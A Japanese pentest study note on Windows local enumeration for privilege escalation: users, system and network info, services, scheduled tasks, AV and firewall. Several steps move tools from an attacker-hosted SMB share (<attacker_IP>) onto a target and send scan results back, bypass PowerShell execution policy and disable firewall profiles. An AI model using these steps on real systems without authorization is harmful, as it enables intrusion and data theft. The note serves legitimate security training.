- 関連ノート
	- [🔍 Credentials Harvesting](Active%20Directory/🔍%20Credentials%20Harvesting.md)

- Local Enumeration→AD Enumerationの流れ

---

# 自動化ツールによる列挙

## 目的

- Enumerationを自動化し、すばやく権限昇格ベクターを見つける
- 権限昇格後においても、すばやく機密情報を探索するために使う

>[!WARNING]
> - 過検知や見逃しの可能性を常に考慮する
> - 手動でしか発見できないようなターゲットシステム独自の構成は自動化ツールでは発見できない

## 実行コマンド

自動列挙ツールは過剰検知が多いため、他自動列挙ツールと併用する。
理由は、複数のツールでスキャンすることで、異なる結果や見逃しに気付くことができるから。
また、必ず手動でのスキャンを実施する。

🔗[Seatbelt](https://github.com/GhostPack/Seatbelt)
```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\<attacker_IP>\share /user:username pw
cp \\<attacker_IP>\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\<attacker_IP>\share\seatbelt_result.txt
```
- `-group`オプションの引数例：
	- `all`：全てのチェックを実行（非常に量が多い）
	- `system`：OSの設定、パッチ状況、サービスなどのシステム情報を調査
	- `user`：ユーザーごとの設定、保存された認証情報、履歴などを調査

🔗[WinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\<attacker_IP>\share /user:username pw
cp \\<attacker_IP>\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\<attacker_IP>\share\peas_result.txt
```

- 補足：[Windows用列挙ツール一覧](#Windows用列挙ツール一覧)

---

# ユーザー情報・ホスト名の列挙

## 目的

- どのユーザー・グループが特権を持っていそうかを明らかにする
- どのユーザー・グループがRDP / WinRM接続可能かを明らかにする
	- →ユーザーの列挙が最短のPEベクター
- 補足：[管理者のアカウント運用について](#管理者のアカウント運用について)

> [!TIP] 着目ポイント
> - `admin`：adminが含まれるユーザー・グループは特権をもつ可能性
> - `Backup`：閲覧権限がないファイルでも復元できる権限をもつ可能性
> - `Backup Operators`：組込みグループで、どのファイルでも復元できる特権をもつ
> - `Helpdesk`：一般ユーザーに比べ何か特権を持っている可能性がある
> - `Remote Desktop/Management`グループ：rdp/winrmで接続可能（Administratorも可能）

## ユーザー情報・ホスト名の列挙コマンド

現在のユーザー名・ホスト名
```cmd
whoami
```
- ホスト名はそのマシンの役割や種別を示すことが多い

現在のユーザーが所属するグループ
```powershell
whoami /groups

# グループ名のみの表示
whoami /groups /fo csv | ConvertFrom-Csv | Select-Object "Group Name"
```

現在のユーザーの権限
```cmd
whoami /priv
```
- StateがDisabledは、実行中のプロセスがたった今"使っていない"だけで権限自体は有効

ローカルに存在するユーザー一覧
```powershell
# cmd.exeの場合：net user
Get-LocalUser
```

ローカルに存在するグループ一覧
```powershell
# cmd.exeの場合：net localgroup
Get-LocalGroup
```

グループに所属するユーザー
```powershell
# cmd.exeの場合：net localgroup <group>
Get-LocalGroupMember <group>
```
- 組込みグループの`Administrator`は確認必須

ユーザーアカウントの詳細確認
```cmd
net user <username>
```

---

# 基本的なシステム情報の列挙

## 目的

- マシンのOS、バージョン、アーキテクチャを確認して、利用可能な脆弱性や攻撃ツールを特定する

## 基本的なシステム情報の列挙コマンド

OS・バージョン・アーキテクチャの表示
```powershell
systeminfo
```
- `OS Name`
- `OS Version xxxx Build <num>`：Buildの番号を🔗[List of Microsoft Windows versions - Wikipedia](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)で検索することで、詳細で**正確**なOSバージョンがわかる
- `System Type`：64bitか32bitかで使用できるPEファイルが異なる

`Systeminfo`がAccess deniedの場合
```powershell
Get-ComputerInfo
```
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName

reg query "HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0" /v Identifier
```

インストールされたセキュリティパッチを確認する
```powershell
Get-CimInstance -Class win32_quickfixengineering | 
Where-Object { $_.Description -eq "Security Update" }
```
- インストールされたセキュリティパッチをメモし、ターゲットのOSを🔗[Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/deployments)のページで検索し、未修正の脆弱性を明らかにする
	- 日付範囲は１年のみ選択可能

![](../../Images/Pasted%20image%2020250823155239.png)

$$MSRCの検索結果$$

---

# ネットワーク情報の列挙

## 目的

- FWによる遮断などでポートスキャンでは検知されなかったサービスや、ローカルで動作しているサービスがないかを確認する
- マシンのネットワーク構成や、アクセス可能なリソース（ADや他のマシン）を特定する

## ネットワーク情報収集コマンド

アクティブなネットワーク接続一覧
```powershell
netstat -ano
```
	↓
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       3340
  ...
```
- `State LISTINING`：そのポートで何かのサービスが動作している
- `State ESTABLISHED`：現在使用中
- ==ポート番号から、動作しているサービスを推測できる==し、[実行中のプロセスの列挙](#実行中のプロセスの列挙)で列挙したPIDと突合して、どのポートでどのサービスが動作しているかを確定できる
- 補足：[ルーティングテーブルの見方](#ルーティングテーブルの見方)

すべてのネットワークインターフェース情報
```powershell
ipconfig /all
```
- `Physical Address（MACアドレス）`：MACアドレスにはベンダーごとにプレフィックスがあり、製品を絞ることができる（OUIという）
	- →🔗[MACアドレス検索](https://uic.jp/mac/)
- `DHCP Enabled`：DHCPを利用していない場合は、静的IPの資産で重要性が高い可能性がある
- `DNS Servers`：ターゲット所有かクラウドサービスを使っているか、ターゲットが所有するサーバーであればセキュリティレベルが低い可能性有（ゾーン転送）
>[!NOTE]
>- 異なるサブネットに属する複数のNICを持つ場合は、内部NWへの足がかりとして使える可能性あり
>- たとえば次の画像では、サブネットが異なるIPが確認できるので、このホストを使ってポートフォワーディングすれば、別のネットワークにアクセスできる可能性がある

![](../../Images/Pasted%20image%2020251118082433.png)

$$ipconfigの結果例$$

ルーティングテーブル
```powershell
route print
```
- 侵害した足場から内部NWへアクセスしたいときなど、そのマシンから他にどのマシンにアクセスできそうかを確認できる
	- →怪しいサブネットがあったら[Nmap Live Host Discovery](../../Misc/Nmap%20Live%20Host%20Discovery.md)でアクセス可能なIPアドレスを列挙する
-  [ルーティングテーブルの見方](#ルーティングテーブルの見方)

ARPテーブルを確認し、同じLAN上の通信可能な他のシステムを発見する
```powershell
arp -a
```
- 補足：224-239はClassDで、マルチキャスト(1対多)専用

---

# インストール済みアプリケーションの列挙

## 目的

- コンピューターやユーザーにインストールされているアプリケーション/ソフトウェアを特定し、権限昇格やその他の攻撃ベクターを探す
- インストール済アプリケーションはユーザーごとに異なるため、**権限昇格後も**、そのユーザーがインストールしたアプリケーションを列挙べき

## インストール済みアプリケーションの列挙コマンド

レジストリからインストール済アプリケーションの列挙
```powershell
# Access deninedのときは、reg query "HKLM\..."もしくはGet-Item "HKLM\.."
$paths = @(
"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*","HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*")
Get-ItemProperty -Path $paths -ErrorAction SilentlyContinue |
Where-Object { $_.DisplayName } |
Select-Object DisplayName, DisplayVersion, InstallLocation |
Sort-Object DisplayName
```
- →パスワードマネージャーを使っている場合は、クラックへ：[Password Attack](../Common/Password%20Attack.md)
- →設定ファイルに含まれる認証情報列挙へ：[🔍 Credentials Harvesting](Active%20Directory/🔍%20Credentials%20Harvesting.md)

インストール済アプリケーションの列挙モレがないことを確認
```powershell
# 64bit版
dir "C:\Program Files"
# 32bit版
dir "C:\Program Files (x86)"
# Downloadフォルダの探索
dir ~\Downloads
```
- 補足：[インストール済みアプリ列挙コマンド詳細](#インストール済みアプリ列挙コマンド詳細)
- [HKCU・HKLMの違い](../../Misc/用語.md#HKCU・HKLMの違い)

---

# 実行中のプロセスの列挙

## 目的

- 実行中のプロセスを確認し、脆弱なアプリケーションや特権のあるプロセスを特定する
- どのプロセスがどのポートで動作しているか確定させる
- プロセス情報の中に機敏な情報がないかを探す

## プロセスの列挙コマンド

実行中プロセスの確認
```powershell
ps | Where-Object -Property ProcessName -notin "svchost"
```
- →Idと[ネットワーク情報の列挙](#ネットワーク情報の列挙)の`netstat`で表示されたPIDを突合し、どのポートでどのプロセス（ProcessName）が動作しているかを確定できる

実行中のプロセスの絞りこみ表示
```powershell
ps -id <PID>
```

実行プロセスのディレクトリ表示
```powershell
ps -id <PID> | Select-Object Path
```

リアルタイムにプロセスの状況を確認（🔗[Watch-Command.ps1](https://github.com/markwragg/PowerShell-Watch/blob/master/Watch/Public/Watch-Command.ps1)）
```powershell
# kaliにwatch-command.ps1をインストールして転送したうえでインポートする
import-module .\Watch-Command.ps1

# 実行時のプロセスとの差分のみを30秒間隔で表示する
ps <search_word> -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
```
- 出力の「SI」はSessionIDの意
	- 0： システムサービス、バックグラウンドプロセスが実行される特別なセッションであり、**高権限の可能性が高い**
	- 1：最初のユーザーログオンセッションであり、一般ユーザーのプロセスが実行される
	- 2以降：追加のユーザーログオンセッション
>[!TIP]
>- サービス、スケジュールタスクで編集可能なファイルが実行されていない場合は、プロセスを疑う
>	- → プロセスのSIが「0」、かつファイルをペイロードで上書きできれば、権限昇格につながる可能性がある

---

# サービスの列挙

## 目的

- 以下の条件を満たした権限昇格に利用可能なWindows サービスを特定する  
	- 高権限（LocalSystem / 管理者権限）で実行されているもの
	- サービスバイナリや設定が一般ユーザーにより変更可能なもの  
	- Unquoted Service Path や非標準ディレクトリで実行のもの

## サービスの列挙コマンド

- [サービス](../../Misc/用語.md#サービス)
- [Serviceを利用したPrivEsc](💥Windows%20Privilege%20Escalation.md#Serviceを利用したPrivEsc)

実行中のサービス一覧を列挙
```powershell
# cmd.exeの場合：sc query [service] ・ sc qc [service]
Get-CimInstance -ClassName Win32_Service |
  Where-Object { 
      $_.State -eq 'Running' -and 
      $_.StartName -notin @('NT AUTHORITY\LocalService', 'NT AUTHORITY\NetworkService') 
  } |
  Select-Object Name, StartName, PathName
```

編集可能(M)なサービス一覧の列挙 w/🔗[PowerUp.ps1](https://powersploit.readthedocs.io/en/latest/Privesc/)
```powershell
# PowerShellが利用できないときは、Accesschk.exeを使用する（方法はHackTricksに記載）
powershell -ep bypass
import-module .\PowerUp.ps1
Get-ModifiableService
Get-ModifiableServiceFile
```

[Service Exploits - Unquoted Service Path](💥Windows%20Privilege%20Escalation.md#Service%20Exploits%20-%20Unquoted%20Service%20Path) 用に、Windows標準フォルダ以外で実行されるサービス、かつ、バイナリがクオテーションで囲まれていないものを列挙
```cmd
# 最新環境ではwmicは使えない
wmic service get Name, PathName, StartName |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
```powershell
Get-WmiObject win32_service | Select-Object Name, PathName, StartName | Where-Object { $_.PathName -notmatch 'C:\\Windows\\' -and $_.PathName -notmatch '"' }
```
- ⚠️出力のPathNameが空白となるものは、アクセス権限がない

### サービス列挙がpermission deniedで実行できないとき

- WinRMやbind shellのように、完全にインタラクティブなシェル（RDPやssh）でないと、WMIやCMIが使えずPermission deniedが返ることがある

レジストリから、Windows標準フォルダ以外で実行されるサービスを列挙
```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
  Where-Object {
    $_.ObjectName -and
    $_.ObjectName -notmatch 'LocalService|NetworkService' -and
    $_.ImagePath -and
    $_.ImagePath -notmatch '^"?C:\\Windows\\'
    # unquoted service path用
    # $_.PathName -notmatch '"'
  } |
  Select PSChildName, ImagePath, ObjectName
```

実行中かつドライバ以外のサービスを列挙
```cmd
sc query type= service state= running
```

>[!NOTE]
>サービスの詳細を確認するには、`sc.exe qc <service>`

---

# スケジュールタスクの列挙

## 目的

PrivEscにつなげられる以下の条件を満たすタスクを列挙する：
1. タスクを実行するユーザーアカウント（プリンシパル）が自分以外
	- 自身の権限で実行されるタスクは権限昇格に使えない

2. タスクがテスターの制限時間内に何度かトリガーされる
	- ScheduleTypeがOne Time OnlyやOnEventはスルーでよい

3. タスクの実行内容がファイルの実行である
　
## スケジュールタスク列挙コマンド

- [Scheduled Tasksを利用したPrivEsc](💥Windows%20Privilege%20Escalation.md#Scheduled%20Tasksを利用したPrivEsc)

PrivEsc可能なScheduled Taskの候補を簡易的に列挙する
	⚠️フィルターを強くしているため、見逃しの可能性あり
```powershell
$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,ScheduleType,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
```
- 上述の条件を満たすタスク以外はフィルターしている

編集可能なScheduled Taskの列挙 w/🔗[PowerUp.ps1](https://powersploit.readthedocs.io/en/latest/Privesc/)
```powershell
powershell -ep bypass
import-module .\PowerUp.ps1
Get-ModifiableScheduledTaskFile
```

基本的な列挙（出力が膨大で使いづらい）
```cmd
schtasks /query /fo LIST /v
```
- 出力の着眼点：
	- Next Run Time：次回いつタスクが実行されるのか
	- Run As User：タスクの実行ユーザー（高権限ユーザーがいい）
	- Task To Run：タスクが実行する内容（ファイルの実行がいい）
	- Schedule Type：時間ごと、イベントごと等、タスクがトリガーされる条件

---

# AVの列挙

## 目的

- マシンにインストールされているアンチウイルス（AV）ソフトウェアを特定し、そのステータスや詳細情報を収集する
- うまくツール/ペイロードが実行できないときの原因の切り分けをする

## AV列挙コマンド例

AVの列挙 (WMIC使用)
```powershell
wmic /namespace:\\root\securitycenter2 path antivirusproduct
```

```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

代替コマンド（Access deniedの場合）
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "antivirus"
```

### Microsoft Defenderの列挙

#### 目的

- Microsoft Defenderのステータスを確認し、リアルタイム保護機能の有効化状況や検出した脅威を把握する

#### コマンド例

```powershell
Get-Service WinDefend
```

リアルタイム保護機能の確認
```powershell
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

検出された脅威の確認
```powershell
Get-MpThreat
```

代替コマンド（Access deniedの場合）
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender" /s
```

---

# ホストベースFWの列挙

## 目的

- ホスト上のFW設定を特定し、ルールやプロファイルの詳細を把握することで、ツール/ペイロードの通信が遮断されないようにする

## ホストベースFWの列挙コマンド例

FWプロファイルの状態確認
```powershell
Get-NetFirewallProfile | Format-Table Name, Enabled
```

特定プロファイルの無効化（管理者権限）
```powershell
Set-NetFirewallProfile -Profile <プロファイル名> -Enabled False
```

FWルールの確認
```powershell
Get-NetFirewallRule | select DisplayName, Enabled, Description
```

ポートの接続テスト
```powershell
Test-NetConnection -ComputerName 127.0.0.1 -Port 80
```

代替コマンド（Access deniedの場合）:
```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s
```

---
---

# 補足事項まとめ

## 管理者のアカウント運用について

- 管理者は、非特権アカウントと特権アカウントの２つをもつことが多い
- 非特権アカウントは通常業務、特権アカウントは管理業務
- 特権アカウントでリスクのあるタスク（インターネットアクセス等）はしない

---

## ルーティングテーブルの見方

![](../../Images/Pasted%20image%2020250724124100.png)

$$ルーティングテーブルの例$$

### セクション一覧

| セクション名           | 内容                          |
| ---------------- | --------------------------- |
| Interface List   | ネットワークインターフェースの一覧（番号、MACなど） |
| IPv4 Route Table | IPv4のルーティングテーブル（アクティブ・永続）   |
| IPv6 Route Table | IPv6のルーティングテーブル（アクティブ・永続）   |

### Interface List

```nginx
Interface List
  4...00 50 56 ab ee 51 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
```

| 項目         | 意味                                        |
| ---------- | ----------------------------------------- |
| インターフェース番号 | `route print` の他セクションで参照される識別子            |
| MACアドレス    | OUIから製品ベンダ・仮想環境（VMware, Hyper-Vなど）の特定に使える |
| アダプタ名      | 利用中のドライバや仮想NICの識別（例：vmxnet3）              |

### IPv4 Route Table > Active Routes

```nginx
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
0.0.0.0                    0.0.0.0          192.168.215.254  192.168.215.220  16
```

| 項目                  | 意味                                                                                                   |
| ------------------- | ---------------------------------------------------------------------------------------------------- |
| Network Destination | 宛先ネットワークアドレス                                                                                         |
| Netmask             | サブネットマスク                                                                                             |
| Gateway             | 宛先に届かない場合の転送先（On-linkの場合は直結）                                                                         |
| Interface           | 出力インターフェースのIPアドレス                                                                                    |
| Metric              | 優先度。値が小さいほど優先的に使用されるルート<br>（まずNetwork Destinationが一致するものを探す。次に同じNetmaskで複数のルートがあった場合のみ、Metricの比較を行う） |

`0.0.0.0`はデフォルトルートで、どのルートにも一致しないパケットが向かう**最後**の手段の経路（`0.0.0.0`＝すべてのIPv4に合致）

### IPv4 Route Table > Persistent Routes

```nginx
Persistent Routes:
  Network Address      Netmask        Gateway Address    Metric
  0.0.0.0              0.0.0.0        192.168.215.254    1
```

| 項目                | 意味                  |
| ----------------- | ------------------- |
| Persistent Routes | 再起動しても保持されるルート      |
| Gateway Address   | 常時使用されるゲートウェイ       |
| Metric            | 通常のルートよりも優先されることがある |

### 攻撃者視点での注目ポイント

| チェック項目                    | 内容                           | 利用方法（攻撃者目線）                      |
| ------------------------- | ---------------------------- | -------------------------------- |
| デフォルトルートの存在               | 0.0.0.0/0 → ゲートウェイ経由で外部通信が可能 | インターネットへ出られる＝リバースシェル可能性あり        |
| 複数ネットワークセグメントへのルート        | 例：10.0.0.0/8、172.16.0.0/12など | 横展開や内部ネットワーク探索への足がかり             |
| On-link セグメントの一覧          | 直接通信可能なネットワーク                | 近隣ホストの発見、SMB/RPC/NetBIOSなどの列挙に利用 |
| Interface List の仮想NICやMAC | VMware, VirtualBox などの仮想環境識別 | 分析環境回避、ターゲットの実環境か調査              |
| Persistent Routes の存在     | 永続的なルーティング設定（業務で必要な通信）       | 通信先の優先ネットワーク、VPNやバックアップ回線などの手がかり |

---

## インストール済みアプリ列挙コマンド詳細

```powershell
# 64ビット版Windowsで動作する32bitアプリ
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion

# 64bitアプリ（全ユーザー）
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion

# 現在ログオン中のユーザーだけにインストールされたアプリ
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
```

---

## Windows用列挙ツール一覧

>[!TIP]
>AVに検知される場合は、[Antivirus Evasion](../AV%20Evasion/Antivirus%20Evasion.md)のテクニックを使用したり、他のツールを試したりする

| ツール名                                                                                   | 説明                                                                                                                                               |
| -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/)         | Windowsの詳細情報を取得するためのユーティリティ集                                                                                                                     |
| [Seatbelt](https://github.com/GhostPack/Seatbelt)                                      | 権限昇格ベクターの自動列挙<br>すでにコンパイル済みのexeファイル：[Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?tab=readme-ov-file) |
| [JAWS](https://github.com/411Hall/JAWS)                                                | 権限昇格ベクターの自動列挙                                                                                                                                    |
| [PowerUp.ps1](https://github.com/cmdMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) | 権限昇格ベクターの自動列挙・一部PrivEsc実行                                                                                                                        |
| [SharpUp.exe](https://github.com/GhostPack/SharpUp)                                    | PowerUpをC#に移行したもの<br>権限昇格ベクターの自動列挙のみ可能                                                                                                           |
| ⭐️[WinPEAS](https://github.com/peass-ng/PEASS-ng/releases/tag/20250124-6ec1269f)       | 権限昇格ベクターの自動列挙(最も有名でまずはこれを使う)                                                                                                                     |
